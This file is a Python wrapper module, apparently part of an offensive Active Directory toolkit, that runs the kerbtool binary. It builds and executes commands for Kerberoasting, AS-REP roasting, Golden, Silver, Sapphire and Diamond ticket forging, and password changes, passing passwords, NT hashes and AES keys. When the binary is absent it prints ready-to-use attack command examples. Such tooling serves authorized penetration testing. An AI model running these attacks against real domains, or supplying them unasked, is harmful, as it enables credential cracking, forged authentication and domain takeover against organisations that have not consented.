"""kerbtool: Go-based Kerberos toolkit for offensive operations on Linux.

Comprehensive Kerberos attack and utility tool supporting:
  - TGT/ST request (password, NT hash, AES key, PKINIT/PFX, keytab)
  - Kerberoasting (single SPN, hash extraction for RC4/AES128/AES256)
  - AS-REP Roasting (without pre-authentication)
  - Ticket forging: Golden, Silver, Sapphire, Diamond tickets with PAC
  - Ticket parsing and inspection (full PAC decode)
  - CCACHE/Kirbi format conversion
  - Keytab management (create, add, remove, update KVNO)
  - kpasswd password reset

Built on gokrb5 fork. SOCKS5 proxy support for tunneled operations.

Source: https://github.com/jfjallid/kerbtool (MIT)
Language: Go. Requires compiled binary.
"""

from __future__ import annotations

import os
import platform
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.attack.kerbtool.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": [
        "kerberos_tgs_requests",
        "kerberos_tgt_requests",
        "ticket_forging",
        "password_change",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": [
        "T1558.003",  # Kerberoasting
        "T1558.004",  # AS-REP Roasting
        "T1558.001",  # Golden Ticket
        "T1558.002",  # Silver Ticket
    ],
    "source": "https://github.com/jfjallid/kerbtool",
}

# kerbtool operation modes
OPERATIONS = {
    "kerberoast": "Request TGS for SPN and extract hash (RC4/AES128/AES256)",
    "asreproast": "AS-REP roast accounts without pre-auth",
    "tgt": "Request TGT (password, hash, AES key, PKINIT, keytab)",
    "st": "Request Service Ticket for specific SPN",
    "forge-golden": "Forge Golden Ticket with PAC (krbtgt hash required)",
    "forge-silver": "Forge Silver Ticket with PAC (service hash required)",
    "forge-sapphire": "Forge Sapphire Ticket (PAC from legit TGT + forged TGS)",
    "forge-diamond": "Forge Diamond Ticket (modify legit TGT PAC)",
    "parse": "Parse and decode .ccache or .kirbi ticket (full PAC dump)",
    "convert": "Convert between ccache and kirbi formats",
    "keytab": "Keytab management (create, add, remove, update KVNO)",
    "kpasswd": "Change password via kpasswd protocol",
}


def _find_kerbtool() -> str | None:
    """Locate the kerbtool binary."""
    path = shutil.which("kerbtool")
    if path:
        return path
    search_dirs = [
        "/opt/tools/kerbtool",
        "/opt/tools",
        os.path.expanduser("~/tools/kerbtool"),
        os.path.expanduser("~/go/bin"),
    ]
    for d in search_dirs:
        candidate = os.path.join(d, "kerbtool")
        if os.path.isfile(candidate):
            return candidate
    return None


def run(args: Any) -> int:
    """Run kerbtool Kerberos operations.

    Wraps the Go-based kerbtool for Kerberos attacks and ticket
    manipulation. Supports kerberoasting, AS-REP roasting, ticket
    forging, and format conversion.

    Args:
        args.operation: kerbtool operation (see OPERATIONS).
        args.target / args.dc_ip: KDC/DC hostname or IP.
        args.domain: AD domain (Kerberos realm).
        args.username: Target or authenticating username.
        args.password: Authentication password.
        args.hash: NT hash for authentication.
        args.aes_key: AES128 or AES256 key.
        args.spn: Target SPN for kerberoasting/ST request.
        args.ticket: Path to .ccache or .kirbi file.
        args.keytab: Path to keytab file.
        args.krbtgt_hash: krbtgt NT/AES hash for Golden Ticket.
        args.domain_sid: Domain SID for ticket forging.
        args.socks: SOCKS5 proxy address for tunneling.
        args.output: Output file path.
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)

    operation = getattr(args, "operation", "kerberoast")
    dc_ip = getattr(args, "dc_ip", None) or getattr(args, "target", None)
    spn = getattr(args, "spn", None)
    ticket = getattr(args, "ticket", None)
    keytab = getattr(args, "keytab", None)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    domain_sid = getattr(args, "domain_sid", None)
    aes_key = getattr(args, "aes_key", None)
    socks = getattr(args, "socks", None)
    output = getattr(args, "output", None)

    print(f"[*] kerbtool: {operation}")
    print(f"[*] Domain: {cred.domain}")
    if dc_ip:
        print(f"[*] KDC: {dc_ip}")

    kerbtool = _find_kerbtool()
    if kerbtool:
        cmd = [kerbtool]

        # Map operations to kerbtool flags
        if operation == "kerberoast":
            cmd.append("--kerberoast")
            if spn:
                cmd.extend(["--spn", spn])
        elif operation == "asreproast":
            cmd.append("--asreproast")
        elif operation == "tgt":
            cmd.append("--tgt")
        elif operation == "st":
            cmd.append("--st")
            if spn:
                cmd.extend(["--spn", spn])
        elif operation.startswith("forge-"):
            forge_type = operation.replace("forge-", "")
            cmd.extend(["--forge", forge_type])
            if krbtgt_hash:
                cmd.extend(["--krbtgt-hash", krbtgt_hash])
            if domain_sid:
                cmd.extend(["--domain-sid", domain_sid])
        elif operation == "parse":
            cmd.append("--parse")
            if ticket:
                cmd.extend(["--ticket", ticket])
        elif operation == "convert":
            cmd.append("--convert")
            if ticket:
                cmd.extend(["--ticket", ticket])
        elif operation == "keytab":
            cmd.append("--keytab")
            if keytab:
                cmd.extend(["--keytab-file", keytab])
        elif operation == "kpasswd":
            cmd.append("--kpasswd")

        # Common auth flags
        if cred.domain:
            cmd.extend(["--domain", cred.domain])
        if cred.username:
            cmd.extend(["--username", cred.username])
        if cred.password:
            cmd.extend(["--password", cred.password])
        if getattr(cred, "nt_hash", None):
            cmd.extend(["--hash", cred.nt_hash])
        if aes_key:
            cmd.extend(["--aes-key", aes_key])
        if dc_ip:
            cmd.extend(["--dc", dc_ip])
        if socks:
            cmd.extend(["--socks", socks])
        if output:
            cmd.extend(["--output", output])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] kerbtool binary not found (Go tool)")
    print()
    print("[*] Available operations:")
    for op, desc in OPERATIONS.items():
        print(f"    {op}: {desc}")
    print()
    print("[*] Build from source:")
    print("    git clone https://github.com/jfjallid/kerbtool")
    print("    cd kerbtool && go build -o kerbtool .")
    print("    cp kerbtool /opt/tools/kerbtool/")
    print()
    print("[*] Key usage examples:")
    print()
    print("  Kerberoasting:")
    print("    kerbtool --kerberoast --spn MSSQLSvc/db.corp.local:1433 \\")
    print("      --domain corp.local --username user --password pass --dc 10.0.0.1")
    print("    Output: hashcat -m 13100 compatible hash")
    print()
    print("  AS-REP Roasting:")
    print("    kerbtool --asreproast --username svc_acct \\")
    print("      --domain corp.local --dc 10.0.0.1")
    print("    Output: hashcat -m 18200 compatible hash")
    print()
    print("  Golden Ticket:")
    print("    kerbtool --forge golden --domain corp.local \\")
    print("      --domain-sid S-1-5-21-... --krbtgt-hash HASH \\")
    print("      --username Administrator --output golden.ccache")
    print()
    print("  Ticket parsing:")
    print("    kerbtool --parse --ticket admin.ccache")
    print("    Full PAC decode with group memberships, logon info")
    return 1
